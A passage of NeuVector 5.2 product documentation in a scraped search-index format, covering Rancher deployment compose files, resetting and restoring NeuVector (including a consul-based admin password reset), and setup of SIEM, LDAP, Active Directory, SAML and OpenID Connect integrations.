shown below. This local user can login directly to the NeuVector console without going through Rancher.    important It is recommended to login directly to the NeuVector console as admin/admin to manually change the admin password to a strong password. This will only change the NeuVector identity provider admin user password (you may see another admin user whose identify provider is Rancher). Alternatively, include a ConfigMap as a secret in the initial deployment from Rancher (see chart values for ConfigMap settings) to set the default admin password to a strong password.  Disabling NeuVector/Rancher SSO​  To disable the ability to login to NeuVector from Rancher Manager, go to Settings -&gt; Configuration.    Rancher Legacy Deployments​  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node. See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  note Deployment on Rancher 2.x/Kubernetes should follow the Kubernetes reference section and/or Helm based deployment.  Deploy the catalog docker-compose-dist.yml, controllers will be deployed on the labelled nodes, enforcers will be deployed on the rest of nodes. (The sample file can be modified so that enforcers are only deployed to the specified nodes.) Pick one of controllers for the manager to connect to. Modify the manager's catalog file docker-compose-manager.yml, set CTRL_SERVER_IP to the controller's IP, then deploy the manager catalog.  Here are the sample compose files. If you wish to only deploy one or two of the components just use that section of the file.  Rancher Manager/Controller/Enforcer Compose Sample File:  manager: scale: 1 image: neuvector/manager restart: always environment: - CTRL_SERVER_IP=controller ports: - 8443:8443 controller: scale: 3 image: neuvector/controller restart: always privileged: true environment: - CLUSTER_JOIN_ADDR=controller volumes: - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector enforcer: image: neuvector/enforcer pid: host restart: always privileged: true environment: - CLUSTER_JOIN_ADDR=controller volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro labels: io.rancher.scheduler.global: true   ","version":"5.2","tagName":"h3"},{"title":"Deploy Without Privileged Mode​","type":1,"pageTitle":"Rancher Deployment","url":"/5.2/deploying/rancher#deploy-without-privileged-mode","content":" On some systems, deployment without using privileged mode is supported. These systems must support the ability to add capabilities using the cap_add setting and to set the apparmor profile.  See the sections on deployment with Docker-Compose, Docker UCP/Datacenter for sample compose files.  Here is a sample Rancher compose file for deployment without privileged mode:  manager: scale: 1 image: neuvector/manager restart: always environment: - CTRL_SERVER_IP=controller ports: - 8443:8443 controller: scale: 3 image: neuvector/controller pid: host restart: always cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=controller volumes: - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector enforcer: image: neuvector/enforcer pid: host restart: always cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=controller volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro labels: io.rancher.scheduler.global: true   ","version":"5.2","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"Rancher Deployment","url":"/5.2/deploying/rancher#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Pick the nodes where the controllers are to be deployed. Label them with &quot;nvcontroller=true&quot;. (With the current sample file, no more than one controller can run on the same node.).  For the manager node, label it “nvmanager=true”.  Add labels in the yaml file. For example for the manager:   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label: &quot;nvmanager=true&quot;   For the controller:   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label: &quot;nvcontroller=true&quot;   For the enforcer, to prevent it from running on a controller node (if desired):   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label_ne: &quot;nvcontroller=true&quot;  ","version":"5.2","tagName":"h3"},{"title":"Removing or Resetting NeuVector","type":0,"sectionRef":"#","url":"/5.2/deploying/remove","content":"","keywords":"","version":"5.2"},{"title":"Removing NeuVector Deployment / Containers​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/5.2/deploying/remove#removing-neuvector-deployment--containers","content":" To remove the NeuVector deployment on Kubernetes, use the same yaml file for deployment in the delete command.  kubectl delete -f neuvector.yaml   This will remove the services and container deployments of NeuVector. You may also want to delete the neuvector namespace, persistent volume and cluster roles and clusterrolebindings created in the deployment steps.  If you deployed NeuVector using a Helm chart or operator you should delete NeuVector using Helm or the appropriate operator command.  ","version":"5.2","tagName":"h3"},{"title":"Resetting NeuVector to an Initial State​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/5.2/deploying/remove#resetting-neuvector-to-an-initial-state","content":" In addition to deleting as discussed above and redeploying NeuVector, the following steps can be taken in Kubernetes to reset NeuVector, which will remove learned rules, groups, and other configuration but leave the NeuVector deployment intact.  Scale the controller deployment to 0.(Optional) if a Persistent Volume is used, delete the persistent volume backup folder created.Scale the controller deployment to 3.  ","version":"5.2","tagName":"h3"},{"title":"Resetting the Admin Password​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/5.2/deploying/remove#resetting-the-admin-password","content":" The admin password is the key to administering the NeuVector deployment and view the cluster network activities. It is important to change the password upon install and keep it safely guarded. Sometimes, the password is guarded too well and become loss or the administrator leaves the company. If you have kubectl access to the cluster, you can reset the admin password to the default using the following steps.  Exec into one of the controllers.  kubectl exec -it &lt;controller&gt; -n neuvector -- sh   Check that the admin entry exists and save the output json somewhere for safe keeping.  consul kv get object/config/user/admin   Take the output from the above consul kv get command and replace the password_hash string with below string.  c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec   Reset the admin account password back to the default. (REPLACE &lt;UPDATED_consul_kv_get_output_with_new_password_hash&gt; BEFORE EXECUTION!!!)  consul kv put object/config/user/admin '&lt;UPDATED_consul_kv_get_output_with_new_password_hash&gt;'   EXAMPLE BELOW: (DO NOT EXECUTE WITHOUT REPLACING WITH OUTPUT)  consul kv put object/config/user/admin '{&quot;fullname&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password_hash&quot;:&quot;c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec&quot;,&quot;pwd_reset_time&quot;:&quot;2022-03-24T20:50:15.341074451Z&quot;,&quot;pwd_hash_history&quot;:null,&quot;domain&quot;:&quot;&quot;,&quot;server&quot;:&quot;&quot;,&quot;email&quot;:&quot;&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;role_oride&quot;:false,&quot;timeout&quot;:300,&quot;locale&quot;:&quot;en&quot;,&quot;role_domains&quot;:{},&quot;last_login_at&quot;:&quot;2022-03-24T20:49:32.577877044Z&quot;,&quot;login_count&quot;:1,&quot;failed_login_count&quot;:0,&quot;block_login_since&quot;:&quot;0001-01-01T00:00:00Z&quot;}'   Response:  Success! Data written to: object/config/user/admin   Login with admin/admin and change password. ","version":"5.2","tagName":"h3"},{"title":"Enterprise Integration","type":0,"sectionRef":"#","url":"/5.2/integration","content":"Enterprise Integration Integrating NeuVector with enterprise infrastructure using RBAC, SYSLOG, SAML, LDAP…","keywords":"","version":"5.2"},{"title":"Restoring NeuVector Configuration","type":0,"sectionRef":"#","url":"/5.2/deploying/restore","content":"","keywords":"","version":"5.2"},{"title":"Restoring NeuVector Configuration​","type":1,"pageTitle":"Restoring NeuVector Configuration","url":"/5.2/deploying/restore#restoring-neuvector-configuration","content":" A backup of the NeuVector configuration can be applied to restore a previous configuration of NeuVector. The backup file can be generated manually as well as imported from the console in Settings -&gt; Configuration, choosing all configuration (e.g. registry configurations, integrations, other settings plus policy) or Policy only (e.g. rules/security policy). The rest API can also be used to automatically backup the configuration, as seen in this example.  Cluster events where all controllers stop running, thereby losing real-time configuration state, can be automatically stored when persistent storage has been properly configured.  note NeuVector does not support partial restoration of objects (e.g. network rules only) nor timestamped restoration (e.g. restore from date/time snapshots). Please use automation scripts to regularly backup configuration files and manage timestamps.  important The backup configuration files should not be edited in any way. Any changes to these from their exported state could result in restoration errors and an unpredictable result.  caution Backup configuration files should be used to restore a NeuVector state on the same cluster from which they were exported. Applying a backup configuration file from a different cluster could result in unpredictable results.  Recommended High Availability Settings​  Manual backup and restore of configuration should be planned only as a last resort. The following steps are recommended for high availability.  Use Helm with a ConfigMap for initial deployment and configuration.Use CRDs for defining policy such as network/process, admission control, and other rules.Run multiple controllers (minimum 3) to auto-sync configuration between running pods, and ensure they run on different hosts.Configure persistent storage (as part of step 1) to recover from any cluster wide failures where all controllers stop running.Regularly backup configuration to timestamped backup files.Restore a cluster's NeuVector configuration from a backup file as a last resort, applying any CRDs after restoration that were new or changed since the previous backup. ","version":"5.2","tagName":"h3"},{"title":"IBM QRadar","type":0,"sectionRef":"#","url":"/5.2/integration/ibmqr","content":"","keywords":"","version":"5.2"},{"title":"Integrating with IBM Qradar​","type":1,"pageTitle":"IBM QRadar","url":"/5.2/integration/ibmqr#integrating-with-ibm-qradar","content":" The IBM® QRadar® Security Information and Event Management (SIEM) helps security teams accurately detect and prioritize threats across the enterprise, and it provides intelligent insights that enable teams to respond quickly to reduce the impact of incidents. By consolidating log events and network flow data from thousands of devices, endpoints and applications distributed throughout your network, QRadar correlates all this different information and aggregates related events into single alerts to accelerates incident analysis and remediation. QRadar SIEM is available on premises and in a cloud environment.  NeuVector is a full lifecycle container security platform which fully supports QRadar integration. This integration enables QRadar to be able to collect events, logs and incident information for container and Kubernetes environment. By using NeuVector’s DSM for QRadar, customers will be able to normalize the NeuVector security log data in QRadar, then analyze, report or remediate container security events.  IBM QRadar and NeuVector DSM​  The NeuVector DSM for integrating with IBM QRadar is published and IBM validated on the IBM X-Force / App Exchange website. It is available for download here from the App Exchange website.  It is also available for download from this site here  How to Integrate NeuVector with QRadar​  Before importing the NeuVector DSM into QRadar, we recommend you check/modify these QRadar configurations to make sure everything will work as expected:  IBM QRadar version 7.3.1 and laterConfigure QRadar “System Settings” to make sure the Syslog Payload Length is big enough for example:    Configure NeuVector to Send Syslog to QRadar​  Enable Syslog configuration in Settings -&gt; Configuration. The Server IP/URL and port should be pointing to the QRadar service IP and Port, and the default Syslog port will be 514. Use the UDP protocol and “In Json” log format. Select the log level and categories to report. In a multi-cluster NeuVector environment, to collect all clusters logs, this setting needs to be enabled in every cluster. You can configure the cluster name on this page to distinguish cluster events from each other.    Configure QRadar to Analyze NeuVector Logs​  Enable or Import the NeuVector DSM to QRadar When adding a new QRadar log source, if “NeuVector” appears in the QRadar log source type, then please ignore the log source importing instructions below and take the next step “Add and enable log sources for NeuVector”.    If the “NeuVector” log source type was not found in QRadar, please refer to QRadar user manual to install NeuVector DSM via Admin &gt; Extension Management.    Add and enable log sources for NeuVector  Now we can add a new log source for NeuVector logs:    “Log Source Identifier” should be the lead controller’s pod name. NeuVector’s lead controller’s pod name can be found in the raw log data of QRadar or from NeuVector’s management console “Assets\\Controllers” as below:    Multiple log sources should be added if there are multiple NeuVector clusters running. NeuVector log source is added and enabled:    Verify the Log Activities​  Generate some NeuVector logs, for example Network Policy Violations, Configuration change events or do some Vulnerability Scans on containers/nodes. These incident or event logs will be sent to QRadar in seconds. And the NeuVector logs should be normalized in QRadar console. It can also be verified through QRadar’s DSM editor:      Integration Summary​  With the completed integration, NeuVector security and management events can be managed through QRadar together with event data from other sources. QRadar serves as the permanent event storage for NeuVector events, while the NeuVector controller performs real-time security responses and short-term cluster storage for events. QRadar can perform advanced correlation and alerting for critical container and Kubernetes security events. ","version":"5.2","tagName":"h3"},{"title":"IBM Security Advisor","type":0,"sectionRef":"#","url":"/5.2/integration/ibmsa","content":"","keywords":"","version":"5.2"},{"title":"Integrating with IBM Security Advisor​","type":1,"pageTitle":"IBM Security Advisor","url":"/5.2/integration/ibmsa#integrating-with-ibm-security-advisor","content":" NeuVector Integrates with IBM Security Advisor on IBM Cloud.  To generate the registration URL required, please log into the NeuVector console as an administrator and go to Settings -&gt; Configuration.  Enable &quot;Integrate with IBM Security Advisor&quot; -&gt; SubmitClick &quot;Get URL&quot; -&gt; Copy to clipboard    Then return to the IBM Security Advisor console, and under &quot;Enter the NeuVector setup URL&quot;, type in https://{NeuVector controller hostname/ip}:{port} and paste what is copied in from the steps above. For the port, use the exposed NeuVector REST API port (default is 10443). For multi-cluster environments this is also the 'fed-worker' service which exposes this port.  IBM Security Advisor will communicate with your NeuVector cluster controller thru the provided hostname or IP. Note: This may need to be exposed as a service for access from outside the Kubernetes cluster, similar to how the REST API is exposed as a service.  Verifying the Connection​  When the connection is successfully created between IBM Security Advisor &amp; NeuVector, you will see the green &quot;Connected at {date, time}&quot; icon next to &quot;Integrate with IBM Security Advisor&quot; in the NeuVector Console.    Reviewing Security Events in IBM Security Advisor​  A summary card with security event information is displayed.    Each security event can be investigated in more detail, as shown below:    ","version":"5.2","tagName":"h3"},{"title":"Removing the Integration​","type":1,"pageTitle":"IBM Security Advisor","url":"/5.2/integration/ibmsa#removing-the-integration","content":" If you delete a NeuVector integration connection in your IBM Cloud account, remember to also disable the &quot;IBM SA integration&quot; for that NeuVector cluster in Settings -&gt; Configuration. ","version":"5.2","tagName":"h3"},{"title":"SAML (ADFS)","type":0,"sectionRef":"#","url":"/5.2/integration/adfs","content":"","keywords":"","version":"5.2"},{"title":"Setting Up ADFS and NeuVector Integration​","type":1,"pageTitle":"SAML (ADFS)","url":"/5.2/integration/adfs#setting-up-adfs-and-neuvector-integration","content":" This section describes the setup steps in ADFS first, then in the NeuVector console.  ADFS Setup​  From AD FS Management, right click on “Relying Party Trusts” and select “Add Relying Party Trust…”.    Select “Start” button from Welcome step.    Select “Enter data about the relying party manually” and select “Next”.    Enter a unique name for Display name field and select “Next”.    Select “Next” to skip token encryption.    Check “Enable support for the SAML 2.0 WebSSO protocol” and enter the SAML Redirect URI from NeuVector Settings&gt;SAML Setting page into the “Relying party SAML 2.0 SSO service URL” field. Select “Next” to continue.    Enter the same SAML Redirect URI into the “Relying party trust identifier” field and click “Add”; then select “Next” to continue.    Customize Access Control; then select “Next” to continue.    Select “Next” to continue.    Select “Close” to finish. Select Edit Claim Issuance Policy…    Select “Add Rule…” and choose “Send LDAP Attributes as Claims”; then select “Next”. Name the rule and choose Active Directory as the Attribute store. Only Username outgoing claim is required for authentication if default role is set; else groups is needed for role mapping. Email is optional.  SAM-Account-Name -&gt; UsernameE-Mail-Address -&gt; EmailToken-Groups – Unqalified Names -&gt; groups    Select “Add Rule…” and choose “Transform an Incoming Claim”; then select “Next”. Name the rule and set the field as captured in the screenshot below. The Outgoing name ID format needs to be Transient Identifier.    NeuVector Setup​  Identify Provider Single Sign-On URL  View Endpoints from AD FS Management &gt; Service and use “SAML 2.0/WS-Federation” endpoint URL.Example: https://&lt;adfs-fqdn&gt;/adfs/ls  Identity Provider Issuer  Right click on AD FS from AD FS Management console and select “Edit Federation Service Properties…”; use the “Federation Service identifier”.Example: http://&lt;adfs-fqdn&gt;/adfs/services/trust  X.509 Certificate  From AD FS Management, select Service &gt; Certificate, right click on Token-signing certificate and choose “View Certificate…”Select the Details tab and click “Copy to File”Save it as a Base-64 encoded x.509 (.CER) fileCopy and paste the contents of the file into the X.509 Certificate field  Group claim  Enter the Outgoing claim name for the groupsExample: groups  Default role  Recommended to be “None” unless you want to allow any authenticated user a default role.  Role map  Set the group names of the users for the appropriate role. (See screenshot example below.)    Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector.  ","version":"5.2","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"SAML (ADFS)","url":"/5.2/integration/adfs#troubleshooting","content":" ADFS SamlResponseSignature needs to be either MessageOnly or MessageAndAssertion. Use Get-AdfsRelyingPartyTrust command to verify or update it.   ","version":"5.2","tagName":"h3"},{"title":"Enterprise Integration","type":0,"sectionRef":"#","url":"/5.2/integration/integration","content":"","keywords":"","version":"5.2"},{"title":"Integration​","type":1,"pageTitle":"Enterprise Integration","url":"/5.2/integration/integration#integration","content":" NeuVector provides a number of ways to integrate, including a REST API, CLI, SYSLOG, RBACs, SAML, LDAP, and webhooks. See the Automation section for examples of scripting using the REST API.  Integrations with other ecosystem partners such as Sonatype (Nexus Lifecycle), IBM Cloud (QRadar and Security Advisor), Prometheus/Grafana, are also supported. Many of these can be found on the NeuVector Github page.  The following configurations can be found in Settings:  OpenShift/Kubernetes RBACs​  Select this option if you are using Red Hat OpenShift Role Based Access Controls (RBACs) and would like NeuVector to automatically read and enforce those. If selected, OpenShift users can log into the NeuVector console using their OpenShift credentials, and will only have access to the resources (Projects, containers, nodes etc) according to their role in the OpenShift cluster. OpenShift integration uses the OAuth2 protocol.    important Do not use the setting in OpenShift AllowAllPasswordIdentityProvider which allows any password to be used to log in. This will allow a user to login into NeuVector with any password as well (as a read only user). It will also create a new user in OpenShift for every login (see ‘oc get user’ results).  note The default Admin user of NeuVector and any additional users created in NeuVector will still be active with OpenShift RBACs enabled.  Kubernetes RBACs​  To manually configure RBACs for Kubernetes namespaces, open the Advanced Setting in the new user creation screen in Settings -&gt; Users -&gt; Add User. Here you can enter the namespaces(s) which this user should have access to in NeuVector.    SYSLOG​  Enter the SYSLOG server IP and select the level of notification. You can also use a DNS name and/or select TCP for configuration.  Webhooks​  Notifications can be sent via webhooks to an endpoint. Enter the endpoint URL for notifications to be sent. Webhook notifications for custom events can be configured in Policy -&gt; Response Rules  Directory/SSO Integration​  See the next sections for LDAP, MSAD, SAML, OpenId and other integrations. See the Basics -&gt; Users &amp; Roles section for predefined and custom roles in NeuVector which can be mapped in the integration. ","version":"5.2","tagName":"h3"},{"title":"LDAP","type":0,"sectionRef":"#","url":"/5.2/integration/ldap","content":"","keywords":"","version":"5.2"},{"title":"LDAP​","type":1,"pageTitle":"LDAP","url":"/5.2/integration/ldap#ldap","content":" Configure the required fields to connect to your LDAP server.    Port. The default port is 389 for SSL disabled and 636 for SSL enabled.User name (optional). We use this admin user name to bind the ldap server for each query.Base dn. This should be a root node in ldap server to search for the ldap user and group.Default role. This is the role that a user will take if role group mapping (below) fails. If the user’s group attribute is found that can be mapped to a role, then the default role will not be used. If no matching group attribute is found, the default role will be taken. If the default role is None in this case, the user login will fail. The ‘test connection’ button will check if a username/password can be authenticated by the configured LDAP server.Admin and Reader role map. This defines how to map a user’s LDAP group membership to the user role in NeuVector. Add the LDAP group list to the corresponding roles. When looking up a user’s group membership in LDAP schema, we assume the group’s member attribute is named as “memberUid”.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.2","tagName":"h3"},{"title":"Microsoft AD","type":0,"sectionRef":"#","url":"/5.2/integration/msad","content":"","keywords":"","version":"5.2"},{"title":"Configuring Active Directory​","type":1,"pageTitle":"Microsoft AD","url":"/5.2/integration/msad#configuring-active-directory","content":" This explains how NeuVector authenticates with Windows Active Directory. The configuration page for Windows Active Directory server is shown below.    User name: This can be any user who has read permission on the Base DN object. The dn attribute should be used as shown below, or the windows logon name such as user@local.nvtest.com.    Base DN: This is a root Windows Active Director object for user authentication. The minimum access permission requirement is read. As shown in the example above, the OU=IT,DC=local,DC=nvtest,DC=com object is only allowed for a user account which is defined in the User name field to allow a read.    With the above User name and Base DN settings, NeuVector is able to bind with Windows Active Directory successfully. Click the TEST CONNECTION to check it.    User name: It is required to use the sAMAccountName attribute ONLY to match. For example, in the screen below NeuVector is going to verify if the ituser(CN=ituser,OU=IT,DC=local,DC=nvtest,DC=com) user is able to login with NeuVector web console.  note NeuVector doesn't use the values of cn, displayName, dn, givenName, name or userPrincipalName attributes etc to verify the test user.    The last part is role mapping for NeuVector for the web console login.    In the example above, the defined group, _d_s_itgroup, in the NeuVector role must have member and sAMAccountType attributes. The value of the sAMAccountType attribute MUST be 268435456 which is the Global Security group and the login username must be in the member lists.    Group member attribute: This is a member attribute for Windows Active Directory by default and it is used for the role mapping purpose, as shown above. If all the requirements are met above, the Windows Active Directory user should be able to login to the NeuVector web console successfully.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.2","tagName":"h3"},{"title":"SAML (Azure AD)","type":0,"sectionRef":"#","url":"/5.2/integration/msazure","content":"","keywords":"","version":"5.2"},{"title":"Integrate with Azure AD SAML authentication​","type":1,"pageTitle":"SAML (Azure AD)","url":"/5.2/integration/msazure#integrate-with-azure-ad-saml-authentication","content":" In the Azure management console, select the ”Enterprise applications&quot; menu item in Azure Active Directory    Select “New Application”    Create a Non-gallery application and give it a unique name    In the application's configuration page, select &quot;Single sign-on&quot; in the left-side panel and choose the SAML-based sign-on    Download the certificate in the base64 format and note the application's Login URL and Azure AD Identifier    In the NeuVector management console, login as an administrator. Select “Settings&quot; in the administrator dropdown menu at the top-right corner. Click SAML settings    Configure the SAML server as follows:  Copy application's &quot;Login URL&quot; as the Single Sign-On URL.Copy &quot;Azure AD Identifier&quot; as the Issuer.Open downloaded the certificate and copy the text to X.509 Certificate box.Set a default role.Enter the group name for role mapping. The group claim returned by Azure are identified by the &quot;Object ID&quot; instead of the name. The group's object ID can be located in Azure Active Directory &gt; Groups &gt; Group name Page. You should use this value to configure group-based role mapping in NeuVector.    Then Enable the SAML server.    Copy the Redirect URL    Return to the Azure management console to setup &quot;Basic SAML Configuration&quot;. Copy NeuVector console's Redirect URL to both &quot;Identifier&quot; and &quot;Reply URL&quot; boxes    Edit &quot;SAML Signing Certificate&quot;, changing the Signing Option to &quot;Sign SAML response&quot;    Edit &quot;User Attributes &amp; Claims&quot; so the response can carry the login user's attributes back to NeuVector. Click &quot;Add new claim&quot; to add &quot;Username&quot; and &quot;Email&quot; claims with &quot;user.userprincipalname&quot; and &quot;user.mail&quot; respectively.    If the users are assigned to the groups in the active directory, their group membership can be added to the claim. Find the application in &quot;App registrations&quot; and edit the manifest. Modify the value of &quot;groupMembershipClaims&quot; to &quot;All&quot;.    Authorize users and groups to access the application so they can login NeuVector console with Azure AD SAML SSO    Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.2","tagName":"h3"},{"title":"OpenID Connect (OIDC) for ADFS","type":0,"sectionRef":"#","url":"/5.2/integration/oidc_adfs","content":"","keywords":"","version":"5.2"},{"title":"Integrating with OpenID Connect (OIDC) for ADFS​","type":1,"pageTitle":"OpenID Connect (OIDC) for ADFS","url":"/5.2/integration/oidc_adfs#integrating-with-openid-connect-oidc-for-adfs","content":" From AD FS Management, click on &quot;Application Groups&quot; and then click on &quot;Add Application Group...&quot;    Enter a name, select &quot;Server application accessing a web API&quot; and then click Next    Enter Redirect URI from NeuVector Settings &gt; OpenID Connect Setting page and then click Next    Enable &quot;Generate a shared secret&quot; checkbox and then click Next    Enter the Identifier created in previous step and then click Next      Enable allatclaims, email, openid and profile scopes and then click Next        Double click on an application group you just created previously    Double click on Web API and then click Issuance Transform Rules tab    Click Add Rule... and select &quot;Send LDAP Attributes as Claims&quot; and then click Next    Enter a Claim rule name, choose Active Directory as the Attribute store and provide the mapping of LDAP attributes to outgoing claim types as below  Token-Groups – Unqualified Names -&gt; groupsUser-Principal-Name -&gt; preferred_usernameE-Mail-Address -&gt; email      NeuVector Setup​  Identity Provider Issuer: https://&lt;adfs-fqdn&gt;/adfsClient ID: It is a &quot;Client Identifier&quot; showing in &quot;Server application&quot; dialog in &quot;Add Application Group Wizard&quot;Client Secret: It is a Secret showing in &quot;Configure Application Credentials&quot; dialog in &quot;Add Application Group Wizard&quot;Group Claim: groups       ","version":"5.2","tagName":"h3"},{"title":"OpenID Connect Azure/Okta","type":0,"sectionRef":"#","url":"/5.2/integration/openid","content":"","keywords":"","version":"5.2"},{"title":"Integrating with OpenID Connect (OIDC) for Azure and Okta​","type":1,"pageTitle":"OpenID Connect Azure/Okta","url":"/5.2/integration/openid#integrating-with-openid-connect-oidc-for-azure-and-okta","content":" To enable OpenID Connect authentication, the Issuer, Client ID and Client secret settings are required. With the issuer URL, NeuVector will call the discovery API to retrieve the Authenorization, Token and User info endpoints.  Locate the OpenID Connect Redirect URI on the top of the NeuVector OpenID Connect Setting page. You will need copy this URI to the Login redirect URIs for Okta and Reply URLs for Microsoft Azure.    Microsoft Azure Configuration​  In Azure Active Directory &gt; App registrations &gt; Application name &gt; Settings Page, locate Application ID string. This is used to set the Client ID in NeuVector. The Client secret can be located in Azure's Keys setting.    The Issuer URL takes https://login.microsoftonline.com/{tenantID}/v2.0 format. To locate the tenantID, go to Azure Active Directory &gt; Properties Page and found the Directory ID, replace it with the tenantID in the URL    If the users are assigned to the groups in the active directory, their group membership can be added to the claim. Find the application in Azure Active Directory -&gt; App registrations and edit the manifest. Modify value of &quot;groupMembershipClaims&quot; to &quot;Application Group&quot;. There is a maximum number of groups that will get emitted into a token. If the user belongs to a large number of groups ( &gt; 200) and the value &quot;All&quot; is used, the token will not include the groups and authorization will failed. Using the value &quot;Application Group&quot; instead of &quot;All&quot; will reduce the number of applicable groups returned in the token.  By default, NeuVector looks for &quot;groups&quot; in the claim to identify the user's group membership. If other claim name is used, you can customize the claim name in NeuVector's OpenID Connect Setting page.  The group claim returned by Azure are identified by the &quot;Object ID&quot; instead of the name. The group's object ID can be located in Azure Active Directory &gt; Groups &gt; Group name Page. You should use this value to configure group-based role mapping in NeuVector -&gt; Settings.    Verify Permissions  Make sure the following permissions have been set from Microsoft Graph  email - View users' email addressopenid - Sign users inprofile - View users' basic profile  Okta Configuration​  Login to your Okta account.  On the lefthand side menu, click “Applications -&gt; Applications“ In the center pane, click “Create App Integration”:    A new pane will pop up to select the “Sign-in method”:    Select “OIDC – OpenID Connect” option.  A derived pane will appear, for “Application Type” selection:    Select “Native Application” option.  The central pane will now show the Native App Integration form where you have to fill in accordingly the following values:  For General Settings section:  App. Integration Name: Name for this integration. Freely choose any name Grant Type (check):  Authorization CodeRefresh TokenResource Owner PasswordImplicit (hybrid)  For Sign-in redirect URIs section:  Go to your NeuVector console and navigate to “Settings” -&gt; “OpenId Connect Settings”. At the top of the page, next to “OpenID Connect Redirect URI” label click “Copy to Clipboard”.    This will copy to the redirect URI to memory. Paste it in its corresponding textbox:    For Assignments section:  Select “Allow everyone in your organization to access” to have this integration available for everyone in your org.    Then click the save button at the bottom of the page.  Once your general setting are saved, you will be taken to your new application integration setup and a client Id will be generated automatically.  In “Client Credentials” section, click edit and modify the “Client Authentication” section from “Use PKCE (for public clients)” to “Use Client Authentication”, and hit save. This will generate a new secret automatically which we will need in upcoming NeuVector setup steps:    Navigate to the “Sign On” tab and edit the “OpenID Connect ID Token” section: Change the Issuer from “Dynamic (based on request domain)” to the fixed “Okta URL”:    The Okta console can operate in two modes, Classic Mode and Developer Mode. In classic mode, the issuer URL is located at Okta Application page's Sign On Tab. To have the user's group membership returned in the claim, you need to add &quot;groups&quot; scope in the NeuVector OpenID Connect configuration page:    In the Developer Mode, Okta allows you to customize the claims. This is done in the API page by managing Authorization Servers (navigate to left hand menu -&gt; Security -&gt; API). The issuer URL is located in each authorization server's Settings tab:    Claims are name/value pairs that contain information about a user as well as meta-information about the OIDC service. In “OpenID Connect ID Token” section, you can create new claims for user's Groups and carry the claim in the ID Token (an ID Token is a JSON Web Token, a compact URL-Safe means of representing claims to be transferred between two parties, so identity information about the user is encoded right into the token and the token can be definitively verified to prove that is hasn’t been tampered with). If a specific scope is configured, make sure to add the scope to NeuVector OpenID Connect setting page, so that the claim can be included after the user is authenticated:    By default, NeuVector looks for &quot;groups&quot; in the claim to identify the user's group membership. If other claim name is used, you can customize the claim name in NeuVector's OpenID Connect Setting page. To configure claims, edit the “OpenID Connect ID Token” section as shown in the next image:    In your application integration page, navigate to “Assignments” tab and make sure you have the corresponding assignments listed:    NeuVector OpenID Connect Configuration​  Configure the proper Issuer URL, Client ID and Client secret in the page.    After the user is authenticated, the proper role can be derived with group-based role mapping configuration. To setup group-based role mapping,  If group-based role mapping is not configured or the matched groups cannot be located, the authenticated user will be assigned with the Default role. If the Default role is set to None, when group-based role mapping fails, the user is not able to login.Specify a list of groups respectively in Admin and Reader role map. The user's group membership is returned by the claims in the ID Token after the user is authenticated. If the matched group is located, the corresponding role will be assigned to the user.  The group can be mapped to the Admin role in NeuVector. Individual users can be 'promoted' to a Federated Admin role by logging in as a local cluster admin, selecting the user with Identify Provider 'OpenID', and editing their role in Settings -&gt; Users/Roles.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.2","tagName":"h3"},{"title":"SAML (Okta)","type":0,"sectionRef":"#","url":"/5.2/integration/saml","content":"","keywords":"","version":"5.2"},{"title":"SAML IDP Configuration​","type":1,"pageTitle":"SAML (Okta)","url":"/5.2/integration/saml#saml-idp-configuration","content":" To configure NeuVector to use Okta SAML IDP server, first, configure the SAML IDP server on the Okta site.    Copy &quot;SAML Redirect URI&quot; from NeuVector SAML Setting page, paste it to Okta's single sign on url, recipient url and destination url fields.Assertion encryption: This field must be unencrypted.Attribute statements: Enter the email and username attributes.Group attribute statements: Enable this if group-based role mapping is required. The default attribute name that NeuVector looks for is NVRoleGroup. If other attribute name is used for the user's group membership, it can be customized in NeuVector's SAML Setting page.  Configure SAML settings in NeuVector UI console.    Use &quot;View Setup Instructions&quot; button as shown in the following screenshot to locate following information, and copy them into NeuVector's SAML page.  Identity 